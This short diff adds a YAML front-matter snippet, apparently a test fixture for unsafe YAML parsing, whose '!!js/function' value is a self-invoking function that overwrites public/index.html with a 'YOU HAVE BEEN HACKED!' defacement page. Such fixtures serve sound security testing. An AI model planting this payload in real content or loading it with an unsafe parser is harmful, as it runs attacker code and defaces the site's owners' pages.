@@ -1,0 +1,7 @@
+---
+hi: there
+test: !!js/function |
+  function f() {
+    console.log('evil start');
+    fs.writeFileSync('public/index.html', '<html><head><title>HACKED</title></head><body><h1>YOU HAVE BEEN HACKED!</h1></body></html>', 'utf8');
+  }();
